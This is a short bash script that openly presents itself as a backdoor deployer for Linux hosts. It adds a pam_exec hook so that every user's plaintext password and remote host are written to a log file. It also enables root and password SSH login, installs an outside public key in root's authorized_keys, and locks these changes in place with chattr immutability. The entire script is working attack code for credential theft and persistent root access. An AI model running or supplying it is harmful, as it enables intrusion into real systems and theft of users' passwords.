#!/bin/bash
echo 'deployes a PAM.d backdoor'
echo
echo "backdooring PAM.d/common-auth"
echo "auth      optional        pam_exec.so     quiet   expose_authtok  /opt/secdump.sh" >> /etc/pam.d/common-auth
echo "done with that"
echo "creating script"
echo '#!/bin/sh' > /opt/secdump.sh
echo 'echo "$(date +%Y-%m-%d_%H:%M:%S)  $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log' >> /opt/secdump.sh
echo "done with that"
echo "making executable"
chmod +x /opt/secdump.sh
echo "done with that"
echo
echo "done done - enjoy!"
echo
#EOF
rm -rf /etc/ssh/sshd_config.d/*.conf
echo "PermitRootLogin yes" > /etc/ssh/sshd_config.d/custom.conf
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config.d/custom.conf
echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config.d/custom.conf
service sshd restart
chattr +i /etc/shadow
mkdir /root/.ssh
chattr -i /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpbYv5s8T6PUQ+76tqRZ0QnJFdFPRHhGCfIMbQcv5KnbZLoLmmMr6okUu9qyhjeG2IsT88dSkypS7LDyJ3j+P6RvuEWDpC8Wj6Ix+oo56JuRcTi9AzXvIPjOhCOiZIvMi5CMEEyrziMmVamqJodJxAiER/8pNBwofg4BE23ManZ18sHrfcS7xW4eQve4dwh27JEDE7/j06D86K2MHCgF1UU/HhmecSWk+GRwpyFyiNlWdtmYeDcCQ/DE01v5U0+zVaXaCfpqccQ6DzW+bafaT9ie/jmdM0hI5bp0zAKnMxb05ooS/ZffgN+GVA6RJ6olXWaIcdtRfJxtZGFZR9vQJ3HZTTqIFRrxIG8PRfQkMHxuXn3ZuUzFnOyy5r/1+0TxvmeyyPmh1LU59iwDpP7kMBNIS9LJnxviHroTIR+7HqGgS/VvdkGxLtl2iK4Srp7muDrzAz7XB+agibn+/yxBevabFDxzMttxs7uuk2YkTT3xz+9mwUTJ74Is3vaiAVUok= jared@geek-kali" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys
chattr +i /etc/ssh/sshd_config.d/custom.conf
chattr +i /etc/pam.d/common-auth
clear
echo "done backdooring!"
echo
